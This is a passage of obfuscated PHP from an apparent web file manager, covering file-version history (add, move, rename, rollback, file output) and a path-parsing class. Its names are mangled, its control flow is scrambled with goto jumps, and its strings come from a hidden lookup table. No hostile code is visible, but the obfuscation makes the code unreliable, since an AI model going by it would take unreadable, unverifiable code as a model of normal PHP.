$câ±å³¯À , $cìğîáĞ¿¯, $C£øæÚã‰²) { $C†‹Ù²§‡ = $A–‚İêäê->getPathOuter($câ±å³¯À ); $dê®¸¨Ÿç = self::parsePath($C†‹Ù²§‡); if (!$dê®¸¨Ÿç) { return; } self::add($dê®¸¨Ÿç); } public static function eventBeforeRename($aÊÚ“ëŠ¸•) { $fİ’¿”Àø¦ =& $_SERVER[Ïº«‚ßèÔˆø]; $CÙš™í÷· = self::parsePath($aÊÚ“ëŠ¸•[0]); if (!$CÙš™í÷·) { return; } $f„Ï„“©Ú = self::checkInHistory($CÙš™í÷·); if (!$f„Ï„“©Ú) { return; } if ($f„Ï„“©Ú[$fİ’¿”Àø¦[29]] == $fİ’¿”Àø¦[192]) { $CŠÜÊàìƒÇ = self::listData($CÙš™í÷·); if ($CŠÜÊàìƒÇ && $CŠÜÊàìƒÇ[$fİ’¿”Àø¦[366]]) { self::moveHistory($CÙš™í÷·, $aÊÚ“ëŠ¸•[1]); } } else { IO::rename($f„Ï„“©Ú[$fİ’¿”Àø¦[76]], $aÊÚ“ëŠ¸•[1]); } } public static function eventBeforeMove($fæÌ³«ğöè) { goto c°‡à¢‘Õ˜; EÑƒ½„±¬ñ: $C¨¢Ğ¢µ  = self::parsePath($fæÌ³«ğöè[1]); if (!$C¨¢Ğ¢µ ) { return; } $aøøá¶Ÿ• = $fæÌ³«ğöè[3]; goto C¼ªÉÚ¨•á; CššÀ‹¡†›: if ($E­˜çø·îË[$B¡¹©§›È¿[29]] == $B¡¹©§›È¿[192]) { $BÈ¸¬ãî© = self::listData($e­¼›”·ƒÄ); $e¾ÙÅ¤‚¢“ = rtrim($C¨¢Ğ¢µ , $B¡¹©§›È¿[8]) . $B¡¹©§›È¿[8] . ($aøøá¶Ÿ• ? $aøøá¶Ÿ• : get_path_this($e­¼›”·ƒÄ)); $c®¬ÌƒäŠà = self::listData($e¾ÙÅ¤‚¢“); if ($BÈ¸¬ãî© && $BÈ¸¬ãî©[$B¡¹©§›È¿[366]] && $c®¬ÌƒäŠà && $c®¬ÌƒäŠà[$B¡¹©§›È¿[366]]) { return self::clear($e­¼›”·ƒÄ); } if ($BÈ¸¬ãî© && $BÈ¸¬ãî©[$B¡¹©§›È¿[366]]) { self::moveHistory($e­¼›”·ƒÄ, $aøøá¶Ÿ•, $C­Õµ™¹”“); } } else { IO::move($E­˜çø·îË[$B¡¹©§›È¿[76]], $C­Õµ™¹”“, !1, $aøøá¶Ÿ•); self::clearEmptyFolder(IO::pathFather($E­˜çø·îË[$B¡¹©§›È¿[76]])); } goto C‡è‡ ¨; C¼ªÉÚ¨•á: $E­˜çø·îË = self::checkInHistory($e­¼›”·ƒÄ); if (!$E­˜çø·îË) { return; } $C­Õµ™¹”“ = self::pathHistory($C¨¢Ğ¢µ ); goto CššÀ‹¡†›; c°‡à¢‘Õ˜: $B¡¹©§›È¿ =& $_SERVER[Ïº«‚ßèÔˆø]; $e­¼›”·ƒÄ = self::parsePath($fæÌ³«ğöè[0]); if (!$e­¼›”·ƒÄ) { return; } goto EÑƒ½„±¬ñ; C‡è‡ ¨: } public static function eventAfterRemove($D¥‰¤ã³´, $E„Ö¯æ“§Œ) { goto dİÛà¤¼ùõ; B´Œ‹Æ‚ß: if ($FÒ¸–×Àù…[$B¡¾§ºî¨[29]] == $B¡¾§ºî¨[192]) { $BÈò«ƒÀêÈ = self::listData($FÏÑÑ¹ˆÉ, !1); if ($BÈò«ƒÀêÈ && $BÈò«ƒÀêÈ[$B¡¾§ºî¨[366]]) { self::clear($FÏÑÑ¹ˆÉ, !1); } } else { IO::remove($FÒ¸–×Àù…[$B¡¾§ºî¨[76]]); self::clearEmptyFolder(IO::pathFather($FÒ¸–×Àù…[$B¡¾§ºî¨[76]])); } goto c¢è°Ó˜«; bÊµ¤…Û: if (!$FÏÑÑ¹ˆÉ) { return; } $FÒ¸–×Àù… = self::checkInHistory($FÏÑÑ¹ˆÉ); if (!$FÒ¸–×Àù…) { return; } goto B´Œ‹Æ‚ß; dİÛà¤¼ùõ: $B¡¾§ºî¨ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$E„Ö¯æ“§Œ) { return; } $FÏÑÑ¹ˆÉ = self::parsePath($D¥‰¤ã³´[0]); goto bÊµ¤…Û; c¢è°Ó˜«: } private static function checkInHistory($cÁäÁÎô) { $FáÇ¿Ú¹Š† = self::pathHistory($cÁäÁÎô); if (!IO::exist($FáÇ¿Ú¹Š†)) { $FáÇ¿Ú¹Š† .= $_SERVER[Ïº«‚ßèÔˆø][1101]; } return IO::exist($FáÇ¿Ú¹Š†) ? IO::info($FáÇ¿Ú¹Š†) : !1; } private static function parsePath($D¬È’õ±Åµ) { goto Fˆ¶ÆöÑ; C½¸¬ê¿ : return $D¬È’õ±Åµ; goto c±˜ÒÑìÕ; Fˆ¶ÆöÑ: $EË£šåÜ¦ô =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$D¬È’õ±Åµ) { return !1; } if ($GLOBALS[$EË£šåÜ¦ô[1102]]) { return; } goto bîñÑ´Êí; cßÍœÎßİ: if (!$D“–·À²î¶ || !$BãâË¤À¦—[$EË£šåÜ¦ô[1103]]) { return !1; } if ($Dò›‚‹ˆÍå == KodIO::KOD_SHARE_ITEM) { $e¾öíÇŒ®Û = IO::init($D¬È’õ±Åµ); if ($e¾öíÇŒ®Û->pathParse[$EË£šåÜ¦ô[1031]]) { return self::parsePath($e¾öíÇŒ®Û->pathParse[$EË£šåÜ¦ô[1031]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto BŠ‰ñ²—†ª; bîñÑ´Êí: $BãâË¤À¦— = KodIO::parse($D¬È’õ±Åµ); $Dò›‚‹ˆÍå = $BãâË¤À¦—[$EË£šåÜ¦ô[29]]; $D“–·À²î¶ = !$Dò›‚‹ˆÍå || $Dò›‚‹ˆÍå == KodIO::KOD_IO || $Dò›‚‹ˆÍå == KodIO::KOD_SHARE_ITEM; goto cßÍœÎßİ; BŠ‰ñ²—†ª: $b‰°šùä­ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $EË£šåÜ¦ô[1104]); foreach ($b‰°šùä­ as $d‰ÄÕÀÂŞ„) { if (!$Dò›‚‹ˆÍå && substr($D¬È’õ±Åµ, 0, strlen($d‰ÄÕÀÂŞ„)) == $d‰ÄÕÀÂŞ„) { return !1; } } self::log($GLOBALS[$EË£šåÜ¦ô[1026]] . $EË£šåÜ¦ô[1105] . $D¬È’õ±Åµ); goto C½¸¬ê¿ ; c±˜ÒÑìÕ: } private static function pathHistory($eö®‹Ã©Ó¬) { $D†¯õÊ£’¨ =& $_SERVER[Ïº«‚ßèÔˆø]; $Dˆ­º‘º±ë = self::$_historyBase . ltrim(KodIO::clear($eö®‹Ã©Ó¬), $D†¯õÊ£’¨[8]); $Dˆ­º‘º±ë = str_replace(array($D†¯õÊ£’¨[1106]), array($D†¯õÊ£’¨[1107]), $Dˆ­º‘º±ë); return $Dˆ­º‘º±ë; } public static function log($DˆÖÇÂê›) { } public static function historyCount($d‡Çù¼Ã¾é) { $e‘„Ñ•Â =& $_SERVER[Ïº«‚ßèÔˆø]; $A•ö†Æ¸ºœ = array(); $A×Ğ¼˜êÉ± = array(); foreach ($d‡Çù¼Ã¾é as $AÔÛÉ¼×ÍÎ) { $b„ããƒ‚¾Ø = get_path_father($AÔÛÉ¼×ÍÎ); if (!$A×Ğ¼˜êÉ±[$b„ããƒ‚¾Ø]) { $A×Ğ¼˜êÉ±[$b„ããƒ‚¾Ø] = array(); } $A×Ğ¼˜êÉ±[$b„ããƒ‚¾Ø][] = get_path_this($AÔÛÉ¼×ÍÎ); } foreach ($A×Ğ¼˜êÉ± as $b„ããƒ‚¾Ø => $dÜçÏÜ†Ô¥) { $fÓšôãµ½Æ = self::parsePath($b„ããƒ‚¾Ø); if (!$fÓšôãµ½Æ) { continue; } foreach ($dÜçÏÜ†Ô¥ as $d½µ®ÑÁŠ©) { $Eß¹È‹¸•ò = self::listData(rtrim($fÓšôãµ½Æ, $e‘„Ñ•Â[8]) . $e‘„Ñ•Â[8] . $d½µ®ÑÁŠ©, !1); if ($Eß¹È‹¸•ò && $Eß¹È‹¸•ò[$e‘„Ñ•Â[366]]) { $A•ö†Æ¸ºœ[rtrim($b„ããƒ‚¾Ø, $e‘„Ñ•Â[8]) . $e‘„Ñ•Â[8] . $d½µ®ÑÁŠ©] = count($Eß¹È‹¸•ò[$e‘„Ñ•Â[366]]); } } } return $A•ö†Æ¸ºœ; } public static function add($A†ôÍÄ®‚) { goto A´ŸóÉï‡; Fî±™çÀ«ó: $BáÅî­® = array($bÔïß»°¿³[392] => $bß¨ƒïÖÙ‹, $bÔïß»°¿³[171] => $F›õÎÇ¨•¹, $bÔïß»°¿³[28] => $E¥›œ·°¯ò[$bÔïß»°¿³[28]] . $bÔïß»°¿³[95] . date($bÔïß»°¿³[1110]) . rand_string(1), $bÔïß»°¿³[78] => $E¥›œ·°¯ò[$bÔïß»°¿³[78]], $bÔïß»°¿³[430] => USER_ID, $bÔïß»°¿³[193] => time(), $bÔïß»°¿³[1111] => $bÔïß»°¿³[33]); IO::mkdir($aÙõø§ß¥Š[$bÔïß»°¿³[1112]]); $Bì¬¿…Å–ø = IO::copy($A†ôÍÄ®‚, $aÙõø§ß¥Š[$bÔïß»°¿³[1112]], !1, $BáÅî­®[$bÔïß»°¿³[28]]); goto E”À£·¸ÚÂ; aƒµÍãìÒ§: $aÅ‰¢êè¿İ = Model($bÔïß»°¿³[714])->get($bÔïß»°¿³[1108]); $cÃ¦²Û„ÌÃ = $GLOBALS[$bÔïß»°¿³[6]][$bÔïß»°¿³[88]][$bÔïß»°¿³[1087]]; $A’²ùè—‚ä = $aÅ‰¢êè¿İ == $bÔïß»°¿³[1109] ? 5 : $cÃ¦²Û„ÌÃ; goto c¦¥„–å©; E”À£·¸ÚÂ: if (!$Bì¬¿…Å–ø) { self::clearEmptyFolder($aÙõø§ß¥Š[$bÔïß»°¿³[1112]]); return !1; } array_unshift($C°µ–ØšÃ, $BáÅî­®); if (count($C°µ–ØšÃ) > $A’²ùè—‚ä) { $d¢Ÿµ×å…Û = array_slice($C°µ–ØšÃ, $A’²ùè—‚ä); foreach ($d¢Ÿµ×å…Û as $Dœø÷Ş¸Ù¤) { IO::remove($aÙõø§ß¥Š[$bÔïß»°¿³[1112]] . $Dœø÷Ş¸Ù¤[$bÔïß»°¿³[28]]); } $C°µ–ØšÃ = array_slice($C°µ–ØšÃ, 0, $A’²ùè—‚ä); } goto C·½½±Ş‹Œ; c¦¥„–å©: if ($cÃ¦²Û„ÌÃ <= 0) { return; } $F›õÎÇ¨•¹ = IO::hashSimple($A†ôÍÄ®‚); $E¥›œ·°¯ò = IO::info($A†ôÍÄ®‚); goto e¢•Ïƒ¦›; aÕ– ñÌ: if ($C°µ–ØšÃ && $C°µ–ØšÃ[0][$bÔïß»°¿³[171]] == $F›õÎÇ¨•¹) { return !0; } if (array_key_exists($bÔïß»°¿³[195], $E¥›œ·°¯ò) && !$E¥›œ·°¯ò[$bÔïß»°¿³[195]]) { return !1; } $bß¨ƒïÖÙ‹ = short_id(time()); goto Fî±™çÀ«ó; e¢•Ïƒ¦›: $C°µ–ØšÃ = $aÙõø§ß¥Š[$bÔïß»°¿³[366]]; if ($E¥›œ·°¯ò[$bÔïß»°¿³[78]] == 0) { return; } if ($E¥›œ·°¯ò[$bÔïß»°¿³[78]] >= 1024 * 1024 * 500) { return !1; } goto aÕ– ñÌ; A´ŸóÉï‡: $bÔïß»°¿³ =& $_SERVER[Ïº«‚ßèÔˆø]; $aÙõø§ß¥Š = self::listData($A†ôÍÄ®‚); if (!$aÙõø§ß¥Š) { return; } goto aƒµÍãìÒ§; C·½½±Ş‹Œ: return self::saveData($aÙõø§ß¥Š[$bÔïß»°¿³[1113]], $C°µ–ØšÃ); goto E­™Ü¦ÔÜã; E­™Ü¦ÔÜã: } public static function remove($có‰÷¬‰®µ, $F°êÒˆÙ¬) { $A§ïµÚ¢Ú =& $_SERVER[Ïº«‚ßèÔˆø]; $b¨”µŠÜÖŒ = self::listData($có‰÷¬‰®µ); $AÙŸí¾éÊ° = array(); if (!$b¨”µŠÜÖŒ) { return !1; } foreach ($b¨”µŠÜÖŒ[$A§ïµÚ¢Ú[366]] as $bÏØçæ¬ëÄ) { if ($bÏØçæ¬ëÄ[$A§ïµÚ¢Ú[392]] == $F°êÒˆÙ¬) { IO::remove($b¨”µŠÜÖŒ[$A§ïµÚ¢Ú[1112]] . $bÏØçæ¬ëÄ[$A§ïµÚ¢Ú[28]]); continue; } $AÙŸí¾éÊ°[] = $bÏØçæ¬ëÄ; } return self::saveData($b¨”µŠÜÖŒ[$A§ïµÚ¢Ú[1113]], $AÙŸí¾éÊ°); } public static function clear($DĞ›‰Õ, $cŸ¾·ñÈ˜ = true) { $b‘ˆ’»å‚§ =& $_SERVER[Ïº«‚ßèÔˆø]; $Aë…¹øæÛ— = self::listData($DĞ›‰Õ, $cŸ¾·ñÈ˜); if (!$Aë…¹øæÛ—) { return !1; } foreach ($Aë…¹øæÛ—[$b‘ˆ’»å‚§[366]] as $eã¤™¾Òµâ) { IO::remove($Aë…¹øæÛ—[$b‘ˆ’»å‚§[1112]] . $eã¤™¾Òµâ[$b‘ˆ’»å‚§[28]]); } return self::saveData($Aë…¹øæÛ—[$b‘ˆ’»å‚§[1113]], array()); } public static function moveHistory($d¥÷·¤Œ, $f‰·¢£¼óÊ = '', $DÁæîçÄ×® = '') { goto f¨Ô©ìÙÍÇ; f¨Ô©ìÙÍÇ: $aÜ”éñ¨×é =& $_SERVER[Ïº«‚ßèÔˆø]; $dóÎ„ñì†ª = self::listData($d¥÷·¤Œ, !1); if (!$dóÎ„ñì†ª || !$dóÎ„ñì†ª[$aÜ”éñ¨×é[366]]) { return !1; } goto dòŒÊ†Â; dòŒÊ†Â: $AÛˆ¦ñğ©» = $aÜ”éñ¨×é[1101]; $f‰·¢£¼óÊ = $f‰·¢£¼óÊ ? $f‰·¢£¼óÊ : get_path_this($d¥÷·¤Œ); $DÁæîçÄ×® = $DÁæîçÄ×® ? $DÁæîçÄ×® : $dóÎ„ñì†ª[$aÜ”éñ¨×é[1112]]; goto aóÓÙ²Õ›ë; aóÓÙ²Õ›ë: $fÛ™¾”‡„¤ = substr(get_path_this($dóÎ„ñì†ª[$aÜ”éñ¨×é[1113]]), 0, -strlen($AÛˆ¦ñğ©»)); foreach ($dóÎ„ñì†ª[$aÜ”éñ¨×é[366]] as $A÷ˆµÙ®‰ => $D»›÷‚ù³¡) { $b¬Äš™ŠÂ = $f‰·¢£¼óÊ . substr($D»›÷‚ù³¡[$aÜ”éñ¨×é[28]], strlen($fÛ™¾”‡„¤)); $e‹øñ¹–æ– = IO::move($dóÎ„ñì†ª[$aÜ”éñ¨×é[1112]] . $D»›÷‚ù³¡[$aÜ”éñ¨×é[28]], $DÁæîçÄ×®, !1, $b¬Äš™ŠÂ); if ($e‹øñ¹–æ–) { $dóÎ„ñì†ª[$aÜ”éñ¨×é[366]][$A÷ˆµÙ®‰][$aÜ”éñ¨×é[28]] = $b¬Äš™ŠÂ; } } $dóÎ„ñì†ª[$aÜ”éñ¨×é[1113]] = IO::move($dóÎ„ñì†ª[$aÜ”éñ¨×é[1113]], $DÁæîçÄ×®, !1, $f‰·¢£¼óÊ . $AÛˆ¦ñğ©»); goto d©¡ï„‰; d©¡ï„‰: self::saveData($dóÎ„ñì†ª[$aÜ”éñ¨×é[1113]], $dóÎ„ñì†ª[$aÜ”éñ¨×é[366]]); self::clearEmptyFolder($dóÎ„ñì†ª[$aÜ”éñ¨×é[1112]]); goto d¦ÓË‰ğÈ; d¦ÓË‰ğÈ: } public static function rollback($b¿¡ÃÍÍÚµ, $c–†È·”™’) { $aß±¸…›éÏ =& $_SERVER[Ïº«‚ßèÔˆø]; $C…£¤Ñ±®¡ = self::listData($b¿¡ÃÍÍÚµ); if (!$C…£¤Ñ±®¡) { return; } $E åÌî“–š = IO::info($b¿¡ÃÍÍÚµ); foreach ($C…£¤Ñ±®¡[$aß±¸…›éÏ[366]] as $fÑ­ˆ¿¸×È => $aÀ¶¡ëöÛ) { if ($aÀ¶¡ëöÛ[$aß±¸…›éÏ[392]] == $c–†È·”™’) { self::add($b¿¡ÃÍÍÚµ); $c…µŠŒåÒË = $C…£¤Ñ±®¡[$aß±¸…›éÏ[1112]] . $aÀ¶¡ëöÛ[$aß±¸…›éÏ[28]]; $eéÃÈµ‹ªÙ = IO::copy($c…µŠŒåÒË, IO::pathFather($b¿¡ÃÍÍÚµ), REPEAT_REPLACE, $E åÌî“–š[$aß±¸…›éÏ[28]]); if ($eéÃÈµ‹ªÙ) { self::remove($b¿¡ÃÍÍÚµ, $c–†È·”™’); } return $eéÃÈµ‹ªÙ; } } return !1; } public static function setDetail($DšìïËö–æ, $dÅÆøÄ‹‡¢, $a¡‰ğˆ¿³) { $DÀÛ­ë¼¼ß =& $_SERVER[Ïº«‚ßèÔˆø]; $e’Î¡å÷Ã‡ = self::listData($DšìïËö–æ); if (!$e’Î¡å÷Ã‡) { return; } foreach ($e’Î¡å÷Ã‡[$DÀÛ­ë¼¼ß[366]] as $E¥øÁÊÌ­Ï => $fèó‹Òàæù) { if ($fèó‹Òàæù[$DÀÛ­ë¼¼ß[392]] == $dÅÆøÄ‹‡¢) { $e’Î¡å÷Ã‡[$DÀÛ­ë¼¼ß[366]][$E¥øÁÊÌ­Ï][$DÀÛ­ë¼¼ß[1111]] = $a¡‰ğˆ¿³; self::saveData($e’Î¡å÷Ã‡[$DÀÛ­ë¼¼ß[1113]], $e’Î¡å÷Ã‡[$DÀÛ­ë¼¼ß[366]]); return !0; } } return !1; } public static function fileInfo($fØˆô…çéÔ, $BâñÕ³Ò) { goto c½Œ­„¹èó; E¿÷İàÈŠİ: return IO::info($E•”ï†æ©); goto AÚ’ôÆİ†¿; c½Œ­„¹èó: $BŸÙ†ÂÆ°Ø =& $_SERVER[Ïº«‚ßèÔˆø]; $EõÒÉ£ä = self::listData($fØˆô…çéÔ); if (!$EõÒÉ£ä) { show_json(LNG($BŸÙ†ÂÆ°Ø[105]), !1); } goto C›åºŠœ©›; C›åºŠœ©›: $E•”ï†æ© = $BŸÙ†ÂÆ°Ø[33]; foreach ($EõÒÉ£ä[$BŸÙ†ÂÆ°Ø[366]] as $F¾øÏ”ˆ–õ => $cñÒÏ± ‘) { if ($cñÒÏ± ‘[$BŸÙ†ÂÆ°Ø[392]] != $BâñÕ³Ò) { continue; } $E•”ï†æ© = $EõÒÉ£ä[$BŸÙ†ÂÆ°Ø[1112]] . $cñÒÏ± ‘[$BŸÙ†ÂÆ°Ø[28]]; break; } if (!$E•”ï†æ©) { show_json(LNG($BŸÙ†ÂÆ°Ø[105]), !1); } goto E¿÷İàÈŠİ; AÚ’ôÆİ†¿: } public static function fileOut($F°ä˜šæŠ®, $BæŠ‚ìœ¹, $D­Ã¼¿Ê’ = false) { $E£¯óŞ¥ =& $_SERVER[Ïº«‚ßèÔˆø]; $BªÂÌ‚ä£¤ = self::fileInfo($F°ä˜šæŠ®, $BæŠ‚ìœ¹); $cÄËÈôö±Ò =& $GLOBALS[$E£¯óŞ¥[7]]; $D­Ã¼¿Ê’ = isset($cÄËÈôö±Ò[$E£¯óŞ¥[1077]]) && $cÄËÈôö±Ò[$E£¯óŞ¥[1077]] == 1; if (isset($cÄËÈôö±Ò[$E£¯óŞ¥[29]]) && $cÄËÈôö±Ò[$E£¯óŞ¥[29]] == $E£¯óŞ¥[1114]) { return IO::fileOutImage($BªÂÌ‚ä£¤[$E£¯óŞ¥[76]], $cÄËÈôö±Ò[$E£¯óŞ¥[1115]]); } IO::fileOut($BªÂÌ‚ä£¤[$E£¯óŞ¥[76]], $D­Ã¼¿Ê’, get_path_this($F°ä˜šæŠ®)); } public static function listData($BÈ¿äî¾­, $dãÙÄç® = true) { goto bäÁÉÑ­ï¯; dù®äĞ©: if (substr($BÈ¿äî¾­, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $D³•ÃŠò‡˜ = self::pathHistory($BÈ¿äî¾­); $eÍí’Ÿ³’– = array($fèƒ÷·Â‡ª[1113] => $D³•ÃŠò‡˜ . $fèƒ÷·Â‡ª[1101], $fèƒ÷·Â‡ª[1112] => rtrim(get_path_father($D³•ÃŠò‡˜), $fèƒ÷·Â‡ª[8]) . $fèƒ÷·Â‡ª[8], $fèƒ÷·Â‡ª[366] => array()); goto dÁÚ¶íŠÕö; dÁÚ¶íŠÕö: $c”»İ‚Ç‚Õ = IO::getContent($eÍí’Ÿ³’–[$fèƒ÷·Â‡ª[1113]]); if ($c”»İ‚Ç‚Õ) { $DÖ¢³™§¥„ = json_decode($c”»İ‚Ç‚Õ, !0); if (is_array($DÖ¢³™§¥„)) { $eÍí’Ÿ³’–[$fèƒ÷·Â‡ª[366]] = $DÖ¢³™§¥„; } } return $eÍí’Ÿ³’–; goto e÷Ş§íã‰ù; bäÁÉÑ­ï¯: $fèƒ÷·Â‡ª =& $_SERVER[Ïº«‚ßèÔˆø]; if ($dãÙÄç® && !IO::exist($BÈ¿äî¾­)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto dù®äĞ©; e÷Ş§íã‰ù: } private static function saveData($a‘÷ŒÍÚ’”, $B‡•§¥›ï’) { goto d“½¹Øáæ·; d§ ¹ŸÓ×§: return !0; goto E‘†¹ˆŠ¹¼; d“½¹Øáæ·: $dê¢µ—ÄÂõ =& $_SERVER[Ïº«‚ßèÔˆø]; self::log($dê¢µ—ÄÂõ[1116] . $a‘÷ŒÍÚ’” . $dê¢µ—ÄÂõ[68] . count($B‡•§¥›ï’), $dê¢µ—ÄÂõ[699]); if ($B‡•§¥›ï’) { return IO::setContent($a‘÷ŒÍÚ’”, json_encode($B‡•§¥›ï’)); } goto e‰­„µ‰×; e‰­„µ‰×: $f’É É‘… = IO::pathFather($a‘÷ŒÍÚ’”); IO::remove($a‘÷ŒÍÚ’”); self::clearEmptyFolder($f’É É‘…); goto d§ ¹ŸÓ×§; E‘†¹ˆŠ¹¼: } public static function clearEmptyFolder($cÍÈĞÅ¹÷¥) { goto e©Ú·ë‡´; cÎå˜”¥¸Ö: $DáŒèò“á = IO::has($cÍÈĞÅ¹÷¥, !0); if ($DáŒèò“á[$CëÖ§— š[202]] > 0 || $DáŒèò“á[$CëÖ§— š[203]] > 0) { return; } IO::remove($cÍÈĞÅ¹÷¥); goto bõÊÎØÔİ; e©Ú·ë‡´: $CëÖ§— š =& $_SERVER[Ïº«‚ßèÔˆø]; if (trim($cÍÈĞÅ¹÷¥, $CëÖ§— š[8]) == trim(self::$_historyBase, $CëÖ§— š[8])) { return; } $a¯’Ì‡¿ß¬ = IO::pathFather($cÍÈĞÅ¹÷¥); goto cÎå˜”¥¸Ö; bõÊÎØÔİ: self::clearEmptyFolder($a¯’Ì‡¿ß¬); goto Fğİ—ùÕ•¿; Fğİ—ùÕ•¿: } private static function getBasePath() { goto a×„Ì£ö×½; dÌµ‘¤†Œô: $F±¥¯½ˆš = DATA_PATH . $aÙ®Ó±¥¤÷[1119]; $F±¥¯½ˆš = IO::mkdir($F±¥¯½ˆš); $F±¥¯½ˆš = rtrim($F±¥¯½ˆš, $aÙ®Ó±¥¤÷[8]) . $aÙ®Ó±¥¤÷[8]; goto cÆ°ê•‡àñ; cÆ°ê•‡àñ: file_put_contents($F±¥¯½ˆš . $aÙ®Ó±¥¤÷[1120], $aÙ®Ó±¥¤÷[33]); Model($aÙ®Ó±¥¤÷[1117])->set($aÙ®Ó±¥¤÷[1118], $F±¥¯½ˆš); return $F±¥¯½ˆš; goto D¦ä¶²¬ëÓ; a×„Ì£ö×½: $aÙ®Ó±¥¤÷ =& $_SERVER[Ïº«‚ßèÔˆø]; $F±¥¯½ˆš = Model($aÙ®Ó±¥¤÷[1117])->get($aÙ®Ó±¥¤÷[1118]); if (IO::exist($F±¥¯½ˆš)) { return $F±¥¯½ˆš; } goto dÌµ‘¤†Œô; D¦ä¶²¬ëÓ: } } class KodIO { const KOD_SOURCE = "\173\x73\157\x75\162\x63\145\x7d"; const KOD_USER_RECYCLE = "\x7b\x75\163\x65\x72\122\x65\143\x79\x63\154\x65\175"; const KOD_USER_FAV = "\173\x75\x73\x65\x72\x46\141\x76\175"; const KOD_USER_FILE_TAG = "\x7b\165\x73\145\x72\106\151\x6c\145\124\141\147\175"; const KOD_USER_FILE_TYPE = "\173\x75\x73\x65\162\106\151\x6c\x65\x54\x79\x70\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\162\157\165\160\x52\157\x6f\164\123\x65\x6c\146\x7d"; const KOD_USER_SHARE = "\x7b\x75\x73\145\162\123\x68\x61\x72\145\x7d"; const KOD_USER_SHARE_LINK = "\173\165\163\145\162\x53\x68\x61\162\145\114\151\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\150\x61\x72\x65\124\157\115\x65\x7d"; const KOD_SHARE_ITEM = "\173\x73\150\x61\162\145\x49\x74\x65\155\x7d"; const KOD_SHARE_LINK = "\173\x73\x68\x61\x72\x65\x49\x74\x65\155\x4c\x69\x6e\153\175"; const KOD_SEARCH = "\x7b\163\x65\141\162\143\150\x7d"; const KOD_BLOCK = "\x7b\x62\x6c\157\143\x6b\175"; const KOD_IO = "\x7b\x69\x6f\x7d"; const KOD_USER_RECENT = "\x7b\165\163\145\162\122\145\156\x63\145\x6e\164\175"; const KOD_USER_DRIVER = "\173\x64\162\151\x76\x65\162\175"; public static function typeList() { $aØåé­·ƒ§ =& $_SERVER[Ïº«‚ßèÔˆø]; return array($aØåé­·ƒ§[1121] => self::KOD_SOURCE, $aØåé­·ƒ§[1122] => self::KOD_USER_RECYCLE, $aØåé­·ƒ§[1123] => self::KOD_USER_FAV, $aØåé­·ƒ§[1124] => self::KOD_USER_FILE_TAG, $aØåé­·ƒ§[1125] => self::KOD_USER_FILE_TYPE, $aØåé­·ƒ§[1126] => self::KOD_GROUP_ROOT_SELF, $aØåé­·ƒ§[1127] => self::KOD_USER_SHARE, $aØåé­·ƒ§[1128] => self::KOD_USER_SHARE_LINK, $aØåé­·ƒ§[1129] => self::KOD_USER_SHARE_TO_ME, $aØåé­·ƒ§[1130] => self::KOD_SHARE_ITEM, $aØåé­·ƒ§[1131] => self::KOD_SHARE_LINK, $aØåé­·ƒ§[1132] => self::KOD_SEARCH, $aØåé­·ƒ§[1133] => self::KOD_BLOCK, $aØåé­·ƒ§[1134] => self::KOD_IO, $aØåé­·ƒ§[1135] => self::KOD_USER_RECENT, $aØåé­·ƒ§[1136] => self::KOD_USER_DRIVER); } public static function parse($cß¨ôæ«Şå) { goto Cê¤¿òš´¥; c¸Öô‚‹ÑË: $Dˆê¶Ó–Øà = array($E¨é„ŒË‡[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $DÍÒ°Á¸£â[$E¨é„ŒË‡[1103]] = in_array($DÍÒ°Á¸£â[$E¨é„ŒË‡[29]], $Dˆê¶Ó–Øà); return $DÍÒ°Á¸£â; goto E¿§èÁøãæ; Cê¤¿òš´¥: $E¨é„ŒË‡ =& $_SERVER[Ïº«‚ßèÔˆø]; $cß¨ôæ«Şå = self::clear($cß¨ôæ«Şå); $b¤è ç½ÔÇ = array_values(self::typeList()); goto B©ŞÌ¥·š¯; B©ŞÌ¥·š¯: preg_match($E¨é„ŒË‡[1137], $cß¨ôæ«Şå, $EÓ²ºíÓ÷­); $DÍÒ°Á¸£â = array($E¨é„ŒË‡[413] => !1, $E¨é„ŒË‡[1138] => !1, $E¨é„ŒË‡[410] => !1, $E¨é„ŒË‡[76] => $cß¨ôæ«Şå, $E¨é„ŒË‡[1048] => !1, $E¨é„ŒË‡[1047] => $E¨é„ŒË‡[33]); if (is_array($EÓ²ºíÓ÷­) && count($EÓ²ºíÓ÷­) == 5) { $BÒ§ñÀº‘´ = $E¨é„ŒË‡[1139] . $EÓ²ºíÓ÷­[2] . $E¨é„ŒË‡[324]; if (in_array($BÒ§ñÀº‘´, $b¤è ç½ÔÇ)) { $DÍÒ°Á¸£â[$E¨é„ŒË‡[1048]] = $EÓ²ºíÓ÷­[1]; $DÍÒ°Á¸£â[$E¨é„ŒË‡[29]] = $BÒ§ñÀº‘´; $DÍÒ°Á¸£â[$E¨é„ŒË‡[1140]] = substr($BÒ§ñÀº‘´, 1, -1); $DÍÒ°Á¸£â[$E¨é„ŒË‡[392]] = $EÓ²ºíÓ÷­[3]; } $DÍÒ°Á¸£â[$E¨é„ŒË‡[1047]] = $EÓ²ºíÓ÷­[4]; } goto c¸Öô‚‹ÑË; E¿§èÁøãæ: } public static function isTruePath($b¬¬ÜÑø) { goto C¤¿‚åë¶; c¸®œ±ƒæ: if (strpos($b¬¬ÜÑø, $BìãÒªÅ˜é[1106]) === 0) { return !0; } if (strpos($b¬¬ÜÑø, $BìãÒªÅ˜é[1141]) === 0) { return !0; } if (strpos($b¬¬ÜÑø, $BìãÒªÅ˜é[1141]) === 0) { return !0; } goto B×¥÷¶¹š§; B×¥÷¶¹š§: if (strpos($b¬¬ÜÑø, $BìãÒªÅ˜é[1142]) === 0) { return !0; } return !1; goto E¹ÅàßŒËó; C¤¿‚åë¶: $BìãÒªÅ˜é =& $_SERVER[Ïº«‚ßèÔˆø]; if (substr($b¬¬ÜÑø, 0, 1) != $BìãÒªÅ˜é[1139]) { return !0; } if (strpos($b¬¬ÜÑø, $BìãÒªÅ˜é[399]) === 0) { return !0; } goto c¸®œ±ƒæ; E¹ÅàßŒËó: } public static function 